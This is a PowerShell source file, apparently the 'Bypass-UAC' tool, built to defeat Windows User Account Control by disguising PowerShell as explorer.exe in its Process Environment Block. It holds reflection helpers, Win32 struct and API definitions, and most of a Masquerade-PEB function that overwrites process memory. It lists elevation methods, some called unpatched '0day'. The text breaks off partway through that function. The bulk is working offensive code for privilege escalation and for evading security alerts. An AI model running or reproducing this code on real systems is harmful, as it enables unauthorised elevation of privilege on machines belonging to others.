function Bypass-UAC {
<#
.SYNOPSIS
Bypass-UAC provides a framework to perform UAC bypasses based on auto
elevating IFileOperation COM object method calls. This is not a new
technique, traditionally, this is accomplished by injecting a DLL into
"explorer.exe". This is not desirable because injecting into
explorer may trigger security alerts and working with unmanaged DLL's
makes for an inflexible work-flow.

To get around this, Bypass-UAC implements a function which rewrites
PowerShell's PEB to give it the appearance of "explorer.exe". This
provides the same effect because COM objects exclusively rely on Windows's
Process Status API (PSAPI) which reads the process PEB.

#-------------------#
# Supported Methods #
#-------------------#

+ UacMethodSysprep: x32/x64 Win7-Win8
+ ucmDismMethod: x64 Win7+ (unpatched, tested up to 10RS2 14926)
+ UacMethodMMC2: x64 Win7+ (unpatched, tested up to 10RS2 14926)
+ UacMethodTcmsetup: x32/x64 Win7-10 (UAC "0day" ¯\_(ツ)_/¯)
+ UacMethodNetOle32: x32/x64 Win7-10 (UAC "0day" ¯\_(ツ)_/¯)

.DESCRIPTION
Author: Ruben Boonen (@FuzzySec)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.PARAMETER Method

Switch array of supported methods.

.PARAMETER CustomDll

Absolute path to custom proxy DLL. If not provided, the embedded Yamabiko
DLL is used.

.EXAMPLE
C:\PS> Bypass-UAC -Method UacMethodSysprep

.EXAMPLE
C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
#>
	param(
        [Parameter(Mandatory = $True)]
        [ValidateSet('UacMethodSysprep','ucmDismMethod','UacMethodMMC2','UacMethodTcmsetup','UacMethodNetOle32')]
        [String]$Method,
        [Parameter(Mandatory = $False)]
        [String]$CustomDll = $null
    )

    #---------------
    # PSReflect => reflect all the things!
    # https://github.com/mattifestation/PSReflect/blob/master/PSReflect.psm1
    #---------------
    function New-InMemoryModule
    {
    <#
    .SYNOPSIS
    
    Creates an in-memory assembly and module
    
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
    .DESCRIPTION
    
    When defining custom enums, structs, and unmanaged functions, it is
    necessary to associate to an assembly module. This helper function
    creates an in-memory module that can be passed to the 'enum',
    'struct', and Add-Win32Type functions.
    
    .PARAMETER ModuleName
    
    Specifies the desired name for the in-memory assembly and module. If
    ModuleName is not provided, it will default to a GUID.
    
    .EXAMPLE
    
    $Module = New-InMemoryModule -ModuleName Win32
    #>
    
        Param
        (
            [Parameter(Position = 0)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ModuleName = [Guid]::NewGuid().ToString()
        )
    
        $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
        $LoadedAssemblies = $AppDomain.GetAssemblies()
    
        foreach ($Assembly in $LoadedAssemblies) {
            if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
                return $Assembly
            }
        }
    
        $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
        $Domain = $AppDomain
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    
        return $ModuleBuilder
    }
    
    
    # A helper function used to reduce typing while defining function
    # prototypes for Add-Win32Type.
    function func
    {
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $DllName,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [string]
            $FunctionName,
        
            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $ReturnType,
        
            [Parameter(Position = 3)]
            [Type[]]
            $ParameterTypes,
        
            [Parameter(Position = 4)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention,
        
            [Parameter(Position = 5)]
            [Runtime.InteropServices.CharSet]
            $Charset,
        
            [String]
            $EntryPoint,
        
            [Switch]
            $SetLastError
        )
    
        $Properties = @{
            DllName = $DllName
            FunctionName = $FunctionName
            ReturnType = $ReturnType
        }
    
        if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
        if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
        if ($Charset) { $Properties['Charset'] = $Charset }
        if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
        if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
    
        New-Object PSObject -Property $Properties
    }
    
    
    function Add-Win32Type
    {
    <#
    .SYNOPSIS
    
    Creates a .NET type for an unmanaged Win32 function.
    
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: func
    
    .DESCRIPTION
    
    Add-Win32Type enables you to easily interact with unmanaged (i.e.
    Win32 unmanaged) functions in PowerShell. After providing
    Add-Win32Type with a function signature, a .NET type is created
    using reflection (i.e. csc.exe is never called like with Add-Type).
    
    The 'func' helper function can be used to reduce typing when defining
    multiple function definitions.
    
    .PARAMETER DllName
    
    The name of the DLL.
    
    .PARAMETER FunctionName
    
    The name of the target function.
    
    .PARAMETER EntryPoint
    
    The DLL export function name. This argument should be specified if the
    specified function name is different than the name of the exported
    function.
    
    .PARAMETER ReturnType
    
    The return type of the function.
    
    .PARAMETER ParameterTypes
    
    The function parameters.
    
    .PARAMETER NativeCallingConvention
    
    Specifies the native calling convention of the function. Defaults to
    stdcall.
    
    .PARAMETER Charset
    
    If you need to explicitly call an 'A' or 'W' Win32 function, you can
    specify the character set.
    
    .PARAMETER SetLastError
    
    Indicates whether the callee calls the SetLastError Win32 API
    function before returning from the attributed method.
    
    .PARAMETER Module
    
    The in-memory module that will host the functions. Use
    New-InMemoryModule to define an in-memory module.
    
    .PARAMETER Namespace
    
    An optional namespace to prepend to the type. Add-Win32Type defaults
    to a namespace consisting only of the name of the DLL.
    
    .EXAMPLE
    
    $Mod = New-InMemoryModule -ModuleName Win32
    
    $FunctionDefinitions = @(
      (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
      (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
      (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
    )
    
    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
    $Kernel32 = $Types['kernel32']
    $Ntdll = $Types['ntdll']
    $Ntdll::RtlGetCurrentPeb()
    $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
    $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
    
    .NOTES
    
    Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
    
    When defining multiple function prototypes, it is ideal to provide
    Add-Win32Type with an array of function signatures. That way, they
    are all incorporated into the same in-memory module.
    #>
    
        [OutputType([Hashtable])]
        Param(
            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $DllName,
        
            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $FunctionName,
        
            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [String]
            $EntryPoint,
        
            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [Type]
            $ReturnType,
        
            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Type[]]
            $ParameterTypes,
        
            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        
            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CharSet]
            $Charset = [Runtime.InteropServices.CharSet]::Auto,
        
            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Switch]
            $SetLastError,
        
            [Parameter(Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,
        
            [ValidateNotNull()]
            [String]
            $Namespace = ''
        )
    
        BEGIN
        {
            $TypeHash = @{}
        }
    
        PROCESS
        {
            if ($Module -is [Reflection.Assembly])
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
                }
                else
                {
                    $TypeHash[$DllName] = $Module.GetType($DllName)
                }
            }
            else
            {
                # Define one type for each DLL
                if (!$TypeHash.ContainsKey($DllName))
                {
                    if ($Namespace)
                    {
                        $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                    }
                    else
                    {
                        $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                    }
                }
            
                $Method = $TypeHash[$DllName].DefineMethod(
                    $FunctionName,
                    'Public,Static,PinvokeImpl',
                    $ReturnType,
                    $ParameterTypes)
                
                # Make each ByRef parameter an Out parameter
                $i = 1
                foreach($Parameter in $ParameterTypes)
                {
                    if ($Parameter.IsByRef)
                    {
                        [void] $Method.DefineParameter($i, 'Out', $null)
                    }
                
                    $i++
                }
            
                $DllImport = [Runtime.InteropServices.DllImportAttribute]
                $SetLastErrorField = $DllImport.GetField('SetLastError')
                $CallingConventionField = $DllImport.GetField('CallingConvention')
                $CharsetField = $DllImport.GetField('CharSet')
                $EntryPointField = $DllImport.GetField('EntryPoint')
                if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
            
                if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
            
                # Equivalent to C# version of [DllImport(DllName)]
                $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                    $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                    [Reflection.FieldInfo[]] @($SetLastErrorField,
                                               $CallingConventionField,
                                               $CharsetField,
                                               $EntryPointField),
                    [Object[]] @($SLEValue,
                                 ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                                 ([Runtime.InteropServices.CharSet] $Charset),
                                 $ExportedFuncName))
                             
                $Method.SetCustomAttribute($DllImportAttribute)
            }
        }
    
        END
        {
            if ($Module -is [Reflection.Assembly])
            {
                return $TypeHash
            }
        
            $ReturnTypes = @{}
        
            foreach ($Key in $TypeHash.Keys)
            {
                $Type = $TypeHash[$Key].CreateType()
                
                $ReturnTypes[$Key] = $Type
            }
        
            return $ReturnTypes
        }
    }
    
    
    function psenum
    {
    <#
    .SYNOPSIS
    
    Creates an in-memory enumeration for use in your PowerShell session.
    
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
    .DESCRIPTION
    
    The 'psenum' function facilitates the creation of enums entirely in
    memory using as close to a "C style" as PowerShell will allow.
    
    .PARAMETER Module
    
    The in-memory module that will host the enum. Use
    New-InMemoryModule to define an in-memory module.
    
    .PARAMETER FullName
    
    The fully-qualified name of the enum.
    
    .PARAMETER Type
    
    The type of each enum element.
    
    .PARAMETER EnumElements
    
    A hashtable of enum elements.
    
    .PARAMETER Bitfield
    
    Specifies that the enum should be treated as a bitfield.
    
    .EXAMPLE
    
    $Mod = New-InMemoryModule -ModuleName Win32
    
    $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
        UNKNOWN =                  0
        NATIVE =                   1 # Image doesn't require a subsystem.
        WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
        WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
        OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
        POSIX_CUI =                7 # Image runs in the Posix character subsystem.
        NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
        WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
        EFI_APPLICATION =          10
        EFI_BOOT_SERVICE_DRIVER =  11
        EFI_RUNTIME_DRIVER =       12
        EFI_ROM =                  13
        XBOX =                     14
        WINDOWS_BOOT_APPLICATION = 16
    }
    
    .NOTES
    
    PowerShell purists may disagree with the naming of this function but
    again, this was developed in such a way so as to emulate a "C style"
    definition as closely as possible. Sorry, I'm not going to name it
    New-Enum. :P
    #>
    
        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,
        
            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $Type,
        
            [Parameter(Position = 3, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $EnumElements,
        
            [Switch]
            $Bitfield
        )
    
        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }
    
        $EnumType = $Type -as [Type]
    
        $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
    
        if ($Bitfield)
        {
            $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
            $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
            $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
        }
    
        foreach ($Key in $EnumElements.Keys)
        {
            # Apply the specified enum type to each element
            $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
        }
    
        $EnumBuilder.CreateType()
    }
    
    
    # A helper function used to reduce typing while defining struct
    # fields.
    function field
    {
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [UInt16]
            $Position,
            
            [Parameter(Position = 1, Mandatory = $True)]
            [Type]
            $Type,
            
            [Parameter(Position = 2)]
            [UInt16]
            $Offset,
            
            [Object[]]
            $MarshalAs
        )
    
        @{
            Position = $Position
            Type = $Type -as [Type]
            Offset = $Offset
            MarshalAs = $MarshalAs
        }
    }
    
    
    function struct
    {
    <#
    .SYNOPSIS
    
    Creates an in-memory struct for use in your PowerShell session.
    
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: field
    
    .DESCRIPTION
    
    The 'struct' function facilitates the creation of structs entirely in
    memory using as close to a "C style" as PowerShell will allow. Struct
    fields are specified using a hashtable where each field of the struct
    is comprosed of the order in which it should be defined, its .NET
    type, and optionally, its offset and special marshaling attributes.
    
    One of the features of 'struct' is that after your struct is defined,
    it will come with a built-in GetSize method as well as an explicit
    converter so that you can easily cast an IntPtr to the struct without
    relying upon calling SizeOf and/or PtrToStructure in the Marshal
    class.
    
    .PARAMETER Module
    
    The in-memory module that will host the struct. Use
    New-InMemoryModule to define an in-memory module.
    
    .PARAMETER FullName
    
    The fully-qualified name of the struct.
    
    .PARAMETER StructFields
    
    A hashtable of fields. Use the 'field' helper function to ease
    defining each field.
    
    .PARAMETER PackingSize
    
    Specifies the memory alignment of fields.
    
    .PARAMETER ExplicitLayout
    
    Indicates that an explicit offset for each field will be specified.
    
    .EXAMPLE
    
    $Mod = New-InMemoryModule -ModuleName Win32
    
    $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
        DOS_SIGNATURE =    0x5A4D
        OS2_SIGNATURE =    0x454E
        OS2_SIGNATURE_LE = 0x454C
        VXD_SIGNATURE =    0x454C
    }
    
    $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
        e_magic =    field 0 $ImageDosSignature
        e_cblp =     field 1 UInt16
        e_cp =       field 2 UInt16
        e_crlc =     field 3 UInt16
        e_cparhdr =  field 4 UInt16
        e_minalloc = field 5 UInt16
        e_maxalloc = field 6 UInt16
        e_ss =       field 7 UInt16
        e_sp =       field 8 UInt16
        e_csum =     field 9 UInt16
        e_ip =       field 10 UInt16
        e_cs =       field 11 UInt16
        e_lfarlc =   field 12 UInt16
        e_ovno =     field 13 UInt16
        e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
        e_oemid =    field 15 UInt16
        e_oeminfo =  field 16 UInt16
        e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
        e_lfanew =   field 18 Int32
    }
    
    # Example of using an explicit layout in order to create a union.
    $TestUnion = struct $Mod TestUnion @{
        field1 = field 0 UInt32 0
        field2 = field 1 IntPtr 0
    } -ExplicitLayout
    
    .NOTES
    
    PowerShell purists may disagree with the naming of this function but
    again, this was developed in such a way so as to emulate a "C style"
    definition as closely as possible. Sorry, I'm not going to name it
    New-Struct. :P
    #>
    
        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 1, Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,
        
            [Parameter(Position = 2, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,
        
            [Parameter(Position = 3, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $StructFields,
        
            [Reflection.Emit.PackingSize]
            $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
        
            [Switch]
            $ExplicitLayout
        )
    
        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }
    
        [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
            Class,
            Public,
            Sealed,
            BeforeFieldInit'
        
        if ($ExplicitLayout)
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
        }
        else
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
        }
    
        $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    
        $Fields = New-Object Hashtable[]($StructFields.Count)
    
        # Sort each field according to the orders specified
        # Unfortunately, PSv2 doesn't have the luxury of the
        # hashtable [Ordered] accelerator.
        foreach ($Field in $StructFields.Keys)
        {
            $Index = $StructFields[$Field]['Position']
            $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
        }
    
        foreach ($Field in $Fields)
        {
            $FieldName = $Field['FieldName']
            $FieldProp = $Field['Properties']
        
            $Offset = $FieldProp['Offset']
            $Type = $FieldProp['Type']
            $MarshalAs = $FieldProp['MarshalAs']
        
            $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
        
            if ($MarshalAs)
            {
                $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
                if ($MarshalAs[1])
                {
                    $Size = $MarshalAs[1]
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                        $UnmanagedType, $SizeConst, @($Size))
                }
                else
                {
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
                }
                
                $NewField.SetCustomAttribute($AttribBuilder)
            }
        
            if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
        }
    
        # Make the struct aware of its own size.
        # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
        $SizeMethod = $StructBuilder.DefineMethod('GetSize',
            'Public, Static',
            [Int],
            [Type[]] @())
        $ILGenerator = $SizeMethod.GetILGenerator()
        # Thanks for the help, Jason Shirk!
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
    
        # Allow for explicit casting from an IntPtr
        # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
        $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
            'PrivateScope, Public, Static, HideBySig, SpecialName',
            $StructBuilder,
            [Type[]] @([IntPtr]))
        $ILGenerator2 = $ImplicitConverter.GetILGenerator()
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
    
        $StructBuilder.CreateType()
    }
    
    #---------------
    # Win32 Definitions
    #---------------
    
    $Module = New-InMemoryModule -ModuleName UACalamity
    
    $UNICODE_STRING = struct $Module UNICODE_STRING @{
    	Length        = field 0 UInt16
    	MaximumLength = field 1 UInt16
    	Buffer        = field 2 IntPtr
    }
    
    $LIST_ENTRY = struct $Module _LIST_ENTRY @{
    	Flink = field 0 IntPtr
    	Blink = field 1 IntPtr
    }
    
    $PROCESS_BASIC_INFORMATION = struct $Module _PROCESS_BASIC_INFORMATION @{
    	ExitStatus                   = field 0 IntPtr
    	PebBaseAddress               = field 1 IntPtr
    	AffinityMask                 = field 2 IntPtr
    	BasePriority                 = field 3 IntPtr
    	UniqueProcessId              = field 4 UIntPtr
    	InheritedFromUniqueProcessId = field 5 IntPtr
    }
    
    # Partial PEB
    $PEB = struct $Module _PEB @{
    	Ldr32               = field 0 IntPtr -Offset 12
    	ProcessParameters32 = field 1 IntPtr -Offset 16
    	Ldr64               = field 2 IntPtr -Offset 24
    	FastPebLock32       = field 3 IntPtr -Offset 28
    	ProcessParameters64 = field 4 IntPtr -Offset 32
    	FastPebLock64       = field 5 IntPtr -Offset 56
    } -ExplicitLayout
    
    # Partial _PEB_LDR_DATA
    $PEB_LDR_DATA = struct $Module _PEB_LDR_DATA @{
    	Length                          = field 0 UInt32
    	Initialized                     = field 1 Byte
    	SsHandle                        = field 2 IntPtr
    	InLoadOrderModuleList           = field 3 $LIST_ENTRY
    	InMemoryOrderModuleList         = field 4 $LIST_ENTRY
    	InInitializationOrderModuleList = field 5 $LIST_ENTRY
    	EntryInProgress                 = field 6 IntPtr
    }
    
    # Partial _LDR_DATA_TABLE_ENTRY
    $LDR_DATA_TABLE_ENTRY = struct $Module _LDR_DATA_TABLE_ENTRY @{
    	InLoadOrderLinks           = field 0 $LIST_ENTRY
    	InMemoryOrderLinks         = field 1 $LIST_ENTRY
    	InInitializationOrderLinks = field 2 $LIST_ENTRY
    	DllBase                    = field 3 IntPtr
    	EntryPoint                 = field 4 IntPtr
    	SizeOfImage                = field 5 UInt32
    	FullDllName                = field 6 $UNICODE_STRING
    	BaseDllName                = field 7 $UNICODE_STRING
    }
    
    $FunctionDefinitions = @(
    
    	(func kernel32 VirtualProtectEx ([Byte]) @(
    		[IntPtr],                # hProcess
    		[IntPtr],                # lpAddress
    		[UInt32],                # dwSize
    		[UInt32],                # flNewProtect
    		[UInt32].MakeByRefType() # lpflOldProtect
    	)),
    
    	(func kernel32 WriteProcessMemory ([Byte]) @(
    		[IntPtr],                # hProcess
    		[IntPtr],                # lpBaseAddress
    		[IntPtr],                # lpBuffer
    		[UInt32],                # nSize
    		[UInt32].MakeByRefType() # lpNumberOfBytesWritten
    	)),
    
    	(func ntdll NtQueryInformationProcess ([Int]) @(
    		[IntPtr],                                    # hProcess
    		[Int],                                       # lpBaseAddress
    		$PROCESS_BASIC_INFORMATION.MakeByRefType(),  # lpBuffer
    		[Int],                                       # nSize
    		[Int].MakeByRefType()                        # lpNumberOfBytesWritten
    	)),
    
    	(func ntdll RtlEnterCriticalSection ([Void]) @(
    		[IntPtr] # lpCriticalSection
    	)),
    
    	(func ntdll RtlLeaveCriticalSection ([Void]) @(
    		[IntPtr] # lpCriticalSection
    	))
    
    )
    
    $Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'Win32'
    $Kernel32 = $Types['kernel32']
    $NtDll = $Types['ntdll']
    
    #---------------
    # Masquerade-PEB
    #---------------
    
    function Masquerade-PEB {
    <#
    .SYNOPSIS
        Masquerade-PEB uses NtQueryInformationProcess to get a handle to powershell's
        PEB. From there it replaces a number of UNICODE_STRING structs in memory to
        give powershell the appearance of a different process. Specifically, the
        function will overwrite powershell's "ImagePathName" & "CommandLine" in
        _RTL_USER_PROCESS_PARAMETERS and the "FullDllName" & "BaseDllName" in the
        _LDR_DATA_TABLE_ENTRY linked list.
        
        This can be useful as it would fool any Windows work-flows which rely solely
        on the Process Status API to check process identity. A practical example would
        be the IFileOperation COM Object which can perform an elevated file copy if it
        thinks powershell is really explorer.exe ;)!
    
        Notes:
          * Works on x32/64.
      
          * Most of these API's and structs are undocumented. I strongly recommend
            @rwfpl's terminus project as a reference guide!
              + http://terminus.rewolf.pl/terminus/
          
          * Masquerade-PEB is basically a reimplementation of two functions in UACME
            by @hFireF0X. My code is quite different because, unfortunately, I don't
            have access to all those c++ goodies and I could not get a callback for
            LdrEnumerateLoadedModules working!
              + supMasqueradeProcess: https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/sup.c#L504
              + supxLdrEnumModulesCallback: https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/sup.c#L477
          
    .DESCRIPTION
        Author: Ruben Boonen (@FuzzySec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    
    .EXAMPLE
        C:\PS> Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
    #>
    
    	param (
    		[Parameter(Mandatory = $True)]
    		[string]$BinPath
    	)
    
    	if ([System.IntPtr]::Size -eq 4) {
    		$x32Architecture = 1
    	}
    
    	# Current Proc handle
    	$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
    
    	# Helper function to overwrite UNICODE_STRING structs in memory
    	function Emit-UNICODE_STRING {
    		param(
    			[IntPtr]$hProcess,
    			[IntPtr]$lpBaseAddress,
    			[UInt32]$dwSize,
    			[String]$data
    		)
        
    		# Set access protections -> PAGE_EXECUTE_READWRITE
    		[UInt32]$lpflOldProtect = 0
    		$CallResult = $Kernel32::VirtualProtectEx($hProcess, $lpBaseAddress, $dwSize, 0x40, [ref]$lpflOldProtect)
        
    		# Create replacement struct
    		$UnicodeObject = [Activator]::CreateInstance($UNICODE_STRING)
    		$UnicodeObject_Buffer = $data
    		[UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
    		[UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
    		[IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
    		[IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dwSize)
    		[system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)
        
    		# Overwrite PEB UNICODE_STRING struct
    		[UInt32]$lpNumberOfBytesWritten = 0
    		$CallResult = $Kernel32::WriteProcessMemory($hProcess, $lpBaseAddress, $InMemoryStruct, $dwSize, [ref]$lpNumberOfBytesWritten)
        
    		# Free $InMemoryStruct
    		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($InMemoryStruct)
    	}
    
    	# Process Basic Information
    	$_PROCESS_BASIC_INFORMATION = [Activator]::CreateInstance($PROCESS_BASIC_INFORMATION)
    	$ReturnLength = New-Object Int
    	$CallResult = $NtDll::NtQueryInformationProcess($ProcHandle, 0, [ref]$_PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION::GetSize(), [ref]$ReturnLength)
    
    	# PID & PEB address
    	#echo "[?] PID $($_PROCESS_BASIC_INFORMATION.UniqueProcessId)"
    	if ($x32Architecture) {
    		echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $_PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
    	} else {
    		echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $_PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
    	}
        
    	# Lazy PEB parsing
    	$_PEB = [Activator]::CreateInstance($PEB)
    	$_PEB = $_PEB.GetType()
    	$BufferOffset = $_PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
    	$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
    	$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
    
    	# Take ownership of PEB
    	# Not sure this is strictly necessary but why not!
    	if ($x32Architecture) {
    		$NtDll::RtlEnterCriticalSection($PEBFlags.FastPebLock32)
    	} else {
    		$NtDll::RtlEnterCriticalSection($PEBFlags.FastPebLock64)
    	} echo "[!] RtlEnterCriticalSection --> &Peb->FastPebLock"
    
    	# &Peb->ProcessParameters->ImagePathName/CommandLine
    	if ($x32Architecture) {
    		# Offset to &Peb->ProcessParameters
    		$PROCESS_PARAMETERS = $PEBFlags.ProcessParameters32.ToInt64()
    		# x86 UNICODE_STRING struct's --> Size 8-bytes = (UInt16*2)+IntPtr
    		[UInt32]$StructSize = 8
    		$ImagePathName = $PROCESS_PARAMETERS + 0x38
    		$CommandLine = $PROCESS_PARAMETERS + 0x40
    	} else {
    		# Offset to &Peb->ProcessParameters
    		$PROCESS_PARAMETERS = $PEBFlags.ProcessParameters64.ToInt64()
    		# x64 UNICODE_STRING struct's --> Size 16-bytes = (UInt16*2)+IntPtr
    		[UInt32]$StructSize = 16
    		$ImagePathName = $PROCESS_PARAMETERS + 0x60
    		$CommandLine = $PROCESS_PARAMETERS + 0x70
    	}
    
    	# Overwrite PEB struct
